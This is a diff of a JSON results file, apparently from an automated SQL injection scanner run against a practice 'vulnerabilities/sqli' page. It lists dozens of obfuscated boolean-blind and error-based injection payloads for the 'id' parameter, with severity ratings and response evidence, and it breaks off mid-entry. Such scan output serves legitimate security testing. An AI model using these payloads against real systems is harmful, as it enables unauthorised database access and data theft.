+        "payload_value": "'/**/oR/**/NOT/**/1=1/**/aNd/**/0x76756e/**/LIKE/**/'vun",
         "type": "SQLi-boolean_blind",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0193,
+        "response_time": 0.0708,
         "analysis_details": [
-          "[Boolean] Content length changed by 768 bytes",
+          "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1728,60 +1749,39 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
+        "payload_value": "'/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/aNd/**/0x76756e/**/LIKE/**/'vun",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.13,
-        "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/aNd/**/0x76756e='vun",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.1272,
-        "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'/**/oR/**/ROW(1,1)>(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/(sElEcT/**/2/**/uNiOn/**/sElEcT/**/3/**/uNiOn/**/sElEcT/**/4/**/uNiOn/**/sElEcT/**/5)a/**/GROUP/**/BY/**/x)/**/oR/**/'vun1'='vun2",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.1291,
+        "response_time": 0.0706,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'/**/oR/**/MAKE_SET(1=1,1)/**/aNd/**/0x76756e='vun",
+        "type": "SQLi-boolean_blind",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0712,
+        "analysis_details": [
+          "[Boolean] Content length changed by 478 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -1802,7 +1802,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0124,
+        "response_time": 0.0707,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
         ],
@@ -1824,7 +1824,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0132,
+        "response_time": 0.063,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1847,7 +1847,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0214,
+        "response_time": 0.0607,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -1870,10 +1870,32 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.014,
+        "response_time": 0.0616,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0235,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -1893,7 +1915,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0386,
+        "response_time": 0.0258,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1915,51 +1937,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0529,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0681,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0682,
+        "response_time": 0.0605,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -1981,7 +1959,29 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0684,
+        "response_time": 0.0728,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0727,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -2003,123 +2003,9 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0682,
+        "response_time": 0.0841,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/)+'",
-        "type": "SQLi-boolean_blind",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0299,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0831,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/oR/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.068,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "High",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0857,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1/**/IN/**/(sElEcT/**/(0x5356534441414141+(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END))+0x5641534441414141))/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0319,
-        "analysis_details": [
-          "[Boolean] Content length changed by 59 bytes",
-          "[Verified] Syntax Fix Test"
         ],
         "error_log": null
       }
@@ -2139,7 +2025,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0273,
+        "response_time": 0.0617,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -2162,7 +2048,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0372,
+        "response_time": 0.0611,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -2178,14 +2064,37 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1=CONCAT(0x5356534441414141,(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)),0x5641534441414141)/**/)+'",
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/)+'",
         "type": "SQLi-error_based",
-        "severity": "Low",
+        "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0442,
+        "response_time": 0.0841,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/oR/**/1=('S'/**/+/**/'V'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'||(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)||'V'/**/+/**/'A'/**/+/**/'S'/**/+/**/'D'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A'/**/+/**/'A')/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0839,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
@@ -2208,10 +2117,101 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.068,
+        "response_time": 0.0841,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1=CONCAT(0x5356534441414141,(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END)),0x5641534441414141)/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0107,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/1/**/IN/**/(sElEcT/**/(0x5356534441414141+(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/'1'/**/ELSE/**/'0'/**/END))+0x5641534441414141))/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0513,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/'v'/**/+/**/'u'/**/+/**/'n'/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/(sElEcT/**/1/**/uNiOn/**/sElEcT/**/2)/**/END))/**/)+'",
+        "type": "SQLi-boolean_blind",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0291,
+        "analysis_details": [
+          "[Boolean] Content length changed by 59 bytes",
+          "[Verified] Syntax Fix Test"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "High",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.1093,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -2231,7 +2231,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0214,
+        "response_time": 0.0514,
         "analysis_details": [
           "[Boolean] Content length changed by 4432 bytes",
           "[Verified] Logic Swapping (True!=False)"
@@ -2247,40 +2247,17 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/(sElEcT/**/1/**/FROM(sElEcT/**/COUNT(*),CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,FLOoR(RaNd(0)*2))x/**/FROM/**/INFoRMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)/**/)+'",
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/oR/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)+'",
         "type": "SQLi-error_based",
         "severity": "High",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0681,
+        "response_time": 0.109,
         "analysis_details": [
           "[Boolean] Content length changed by 59 bytes",
           "[Verified] Syntax Fix Test"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)+'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0683,
-        "analysis_details": [
-          "[Boolean] Content length changed by 4474 bytes",
-          "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
       }
@@ -2300,9 +2277,32 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0233,
+        "response_time": 0.0514,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
+          "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'+(sElEcT/**/0x76756e/**/WHERE/**/1=1/**/aNd/**/EXP(~(sElEcT/**/*/**/FROM/**/(sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141,'x'))x))/**/)+'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0732,
+        "analysis_details": [
+          "[Boolean] Content length changed by 4474 bytes",
           "[Verified] Logic Swapping (True!=False)"
         ],
         "error_log": null
@@ -2323,10 +2323,32 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0681,
+        "response_time": 0.0726,
         "analysis_details": [
           "[Boolean] Content length changed by 4471 bytes",
           "[Verified] Logic Swapping (True!=False)"
+        ],
+        "error_log": null
+      }
+    },
+    {
+      "target": {
+        "url": "http://snowden.kr/vulnerabilities/sqli/",
+        "method": "GET",
+        "location": "QUERY",
+        "parameter": "id"
+      },
+      "attack_info": {
+        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
+        "type": "SQLi-error_based",
+        "severity": "Low",
+        "description": ""
+      },
+      "evidence": {
+        "status_code": 200,
+        "response_time": 0.0117,
+        "analysis_details": [
+          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -2346,7 +2368,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0105,
+        "response_time": 0.0167,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -2368,53 +2390,9 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0128,
+        "response_time": 0.0174,
         "analysis_details": [
           "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0203,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.022,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
         "error_log": null
       }
@@ -2434,7 +2412,7 @@
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0309,
+        "response_time": 0.0221,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -2449,14 +2427,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)))/**/)||'",
+        "payload_value": "'||(sElEcT/**/CHR(118)||CHR(117)||CHR(110)/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/1=(sElEcT/**/UPPER(XMLType(CHR(60)||CHR(58)||CHR(83)||CHR(86)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||(sElEcT/**/(cAsE/**/wHeN/**/(1=1)/**/THEN/**/1/**/ELSE/**/0/**/END)/**/FROM/**/DUAL)||CHR(86)||CHR(65)||CHR(83)||CHR(68)||CHR(65)||CHR(65)||CHR(65)||CHR(65)||CHR(62)))/**/FROM/**/DUAL)/**/)||'",
         "type": "SQLi-error_based",
         "severity": "Low",
         "description": ""
       },
       "evidence": {
         "status_code": 200,
-        "response_time": 0.0383,
+        "response_time": 0.0277,
         "analysis_details": [
           "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
         ],
@@ -2471,328 +2449,14 @@
         "parameter": "id"
       },
       "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/GTID_SUBSET(CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0532,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.0532,
-        "analysis_details": [
-          "[Error] SQL Execution Error: FUNCTION\\s+.*?\\s+does\\s+not\\s+exist"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/aNd/**/UPDATEXML(1,CONCAT('.',0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141),1)/**/)||'",
-        "type": "SQLi-error_based",
-        "severity": "Low",
-        "description": ""
-      },
-      "evidence": {
-        "status_code": 200,
-        "response_time": 0.053,
-        "analysis_details": [
-          "[Error] SQL Execution Error: XPATH\\s+syntax\\s+error"
-        ],
-        "error_log": null
-      }
-    },
-    {
-      "target": {
-        "url": "http://snowden.kr/vulnerabilities/sqli/",
-        "method": "GET",
-        "location": "QUERY",
-        "parameter": "id"
-      },
-      "attack_info": {
-        "payload_value": "'||(sElEcT/**/0x76756e/**/FROM/**/DUAL/**/WHERE/**/1=1/**/oR/**/JSON_KEYS((sElEcT/**/CONVERT((sElEcT/**/CONCAT(0x5356534441414141,(sElEcT/**/(ELT(1=1,1))),0x5641534441414141))/**/USING/**/utf8)))/**/)||'",
